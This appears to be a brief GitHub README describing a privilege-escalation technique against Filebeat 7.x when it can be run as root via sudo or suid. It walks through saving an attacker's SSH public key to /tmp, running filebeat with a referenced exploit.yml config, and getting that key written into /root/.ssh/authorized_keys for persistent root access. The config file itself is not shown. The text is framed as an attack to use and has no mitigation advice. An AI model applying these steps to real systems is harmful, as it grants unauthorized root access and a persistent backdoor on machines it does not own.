# Filebeat-7.x-Privilege-Escalation
It has been quite few times I have seen Filebeat running as root and capable of running it as root (suid or NOPASSWD).  In fact, the documentation suggests to run filebeat as sudo. https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-starting.html

Here the steps to leverage the filebeat to obtain a shell as root. (arbitrary write in the filesystem).

The following exploit.yml is meant to add the "attacker ssh" key to the authorized_keys file.


Dowload the file exploit.yml.

1) Save your public key in the following file /tmp/attackerkey. 


```
$ cat /tmp/attackerkey 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDSNDOAMkNcqtwWnGjujt3cNcbKvV/TwBNopPwpShW1oC9F8jDhGA+3cI9B/97OQWKZzjVNxKQvRmSwTcSc7I9v6p/A1sVW3NfPhfxUdqFyvl1twTfzk+Mpgix1CZA8Fmde/txMShTlMMtUCVoZGylG9JD7agVpCrO+wT57ZZ3dZRpauNv1fXTZNWfEz2gHMLcNfRqQoEPH4DsyvXeKfrXnJTbz0ocvhFfcHKG7akTCv+Vre5U4DG2+YZPgoJz7l8CS/GCm1kt2h8Sf9EDhhAjI9Jl+nVqawyHaK3fRH+x1uajeq4dXFm3AThwCnZ+PesUyjZ44KU0p16b0aziHl8vZR5r8MXNQPCK8fHHA0HUGQgpwfeAfG+wAhK9xHm/g77X2Yx370YvrBXX82VnrTEg8HBzHXlMoOwAfmmnlQ2eFmAiisXAiIM2R8C5YFxZO8FVET6uMjGhV+ZIyzoVFaVc7InQrRaOfeOMxgdegwxO161VYqiLpBViIyqs/tCxT/az6wmIchwkuCeLPyN54f5qDmS5OtoXXNB0Lt28WDJJhnNRdbCj4nbpkOoiP6fRgJJnqKdPzj9yURwVkFXee1wJ5KneSVBpJiOBbOoE4Cn1s0XfNOEmXYQBPJUZN65kPL+oMNqRM2h1DfIEJY4g+RD/NMDffsEizLxdnlpf30LjZtQ== luigi@lt
```
 
3) Run the follwowing command  sudo ./filebeat -c exploit.yml
4) Enjoy your key added to /root/.ssh/authorized_keys




Thank you.

